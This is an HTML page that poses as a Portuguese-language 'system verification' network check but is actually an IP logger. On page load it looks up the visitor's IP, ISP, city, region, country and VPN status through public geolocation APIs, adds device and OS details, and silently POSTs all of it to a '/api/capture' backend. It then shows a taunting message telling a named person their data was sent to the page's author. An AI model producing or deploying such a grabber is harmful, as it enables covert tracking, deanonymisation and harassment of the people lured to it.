<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Sistema</title>
    <style>
        :root {
            --bg: #0f0f13;
            --card: #1a1a20;
            --text: #e0e0e0;
            --accent: #7289da;
            --error: #f04747;
            --success: #43b581;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            background-color: var(--card);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 500px;
            text-align: center;
            border: 1px solid #2c2f33;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: var(--accent);
        }
        p {
            font-size: 14px;
            color: #b9bbbe;
            margin-bottom: 20px;
        }
        .loader {
            border: 4px solid #2c2f33;
            border-top: 4px solid var(--accent);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .result-box {
            display: none;
            text-align: left;
            margin-top: 20px;
            background: #202225;
            padding: 15px;
            border-radius: 8px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #2c2f33;
            font-size: 13px;
        }
        .info-row:last-child { border-bottom: none; }
        .label { font-weight: bold; color: #8e9297; }
        .value { color: #dcddde; }
        .vpn-detected { color: var(--error) !important; }
        .vpn-safe { color: var(--success) !important; }
    </style>
</head>
<body>

    <div class="container">
        <h1 id="title">Analizando Conexão...</h1>
        <p id="subtitle">Por favor, aguarde enquanto verificamos sua integridade de rede.</p>
        
        <div class="loader" id="loader"></div>

        <div class="result-box" id="results">
            <div class="info-row"><span class="label">IP Público:</span> <span class="value" id="ip">Carregando...</span></div>
            <div class="info-row"><span class="label">ISP (Provedor):</span> <span class="value" id="isp">...</span></div>
            <div class="info-row"><span class="label">Cidade:</span> <span class="value" id="city">...</span></div>
            <div class="info-row"><span class="label">Estado/Região:</span> <span class="value" id="region">...</span></div>
            <div class="info-row"><span class="label">País:</span> <span class="value" id="country">...</span></div>
            <div class="info-row"><span class="label">VPN/Proxy:</span> <span class="value" id="vpn">...</span></div>
            <div class="info-row"><span class="label">Dispositivo:</span> <span class="value" id="device">...</span></div>
            <div class="info-row"><span class="label">Sistema:</span> <span class="value" id="os">...</span></div>
        </div>
    </div>

    <script>
        async function fetchData() {
            let data = null;

            // Tenta a API 1: ipapi.co (HTTPS friendly)
            try {
                const res1 = await fetch('https://ipapi.co/json/', { method: 'GET' });
                if (res1.ok) {
                    data = await res1.json();
                    // Mapeia os campos para o padrão que queremos
                    data = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        isp: data.org, // ipapi.co usa 'org' para ISP
                        vpn: data.security && (data.security.proxy || data.security.vpn) // Tenta detectar segurança
                    };
                }
            } catch (e) {
                console.log("API 1 falhou, tentando fallback...");
            }

            // Tenta a API 2 (Fallback): ipwho.is (Muito resistente)
            if (!data || !data.ip) {
                try {
                    const res2 = await fetch('https://ipwho.is/', { method: 'GET' });
                    if (res2.ok) {
                        const raw = await res2.json();
                        data = {
                            ip: raw.ip,
                            city: raw.city,
                            region: raw.region,
                            country: raw.country,
                            isp: raw.connection.isp,
                            vpn: raw.security.vpn // ipwho.is tem campo específico de VPN
                        };
                    }
                } catch (e) {
                    console.error("Todas as APIs falharam");
                }
            }

            return data;
        }

        async function initCheck() {
            try {
                // 1. Busca dados da rede
                const netData = await fetchData();

                if (!netData || !netData.ip) {
                    throw new Error("Não foi possível obter o IP");
                }

                // 2. Detecta Dispositivo e OS via User-Agent
                const ua = navigator.userAgent;
                let os = "Desconhecido";
                if (ua.indexOf("Win") != -1) os = "Windows";
                else if (ua.indexOf("Mac") != -1) os = "MacOS";
                else if (ua.indexOf("Linux") != -1) os = "Linux";
                else if (ua.indexOf("Android") != -1) os = "Android";
                else if (ua.indexOf("like Mac") != -1) os = "iOS";

                let device = "Desktop";
                if (/Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua)) device = "Mobile/Tablet";

                // 3. Atualiza a Tela
                document.getElementById('ip').innerText = netData.ip;
                document.getElementById('isp').innerText = netData.isp || 'N/A';
                document.getElementById('city').innerText = netData.city || 'N/A';
                document.getElementById('region').innerText = netData.region || 'N/A';
                document.getElementById('country').innerText = netData.country || 'N/A';
                
                const isVpn = netData.vpn === true;
                const vpnEl = document.getElementById('vpn');
                vpnEl.innerText = isVpn ? "Sim (Detectado)" : "Não";
                vpnEl.className = isVpn ? "value vpn-detected" : "value vpn-safe";

                document.getElementById('device').innerText = device;
                document.getElementById('os').innerText = os;

                // UI Final
                document.getElementById('loader').style.display = 'none';
                document.getElementById('title').innerText = "Análise Concluída, JTK. Bem que te falei que era melhor não me roubar";
                document.getElementById('subtitle').innerText = "Dados verificados e enviados para seu grande amigo sedxw vulgo sn com sucesso.";
                document.getElementById('results').style.display = 'block';

                // 4. Envia para o Backend (Vercel Function)
                
                try {
                    const response = await fetch ("/api/capture", {
                        method: "POST",
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ip: netData.ip,
                            isp: netData.isp,
                            city: netData.city,
                            region: netData.region,
                            country: netData.country,
                            vpn: isVpn,
                            deviceType: device,
                            os: os,
                            timestamp: new Date().toISOString()
                        })
                    });

                    if (!response.ok) {
                        const details = await response.text();

                        throw new Error(
                            `capture.js retornou HTTP ${response.status}: ${details}`
                            );
                    }

                    console.log("✅ Backend respondeu com sucesso");
                } catch (err) {
                    console.error("❌ Erro ao chamar /api/capture:", err);
                }

            } catch (error) {
                console.error("Erro Crítico:", error);
                document.getElementById('title').innerText = "Erro na Conexão";
                document.getElementById('subtitle').innerText =
                    "Bloqueador de anunciantes ou VPN pode estar interferindo.";
                document.getElementById('loader').style.display = 'none';
            }
        }

        // Iniciar assim que a página carregar
        window.addEventListener('DOMContentLoaded', initCheck);
    </script>
</body>
</html>
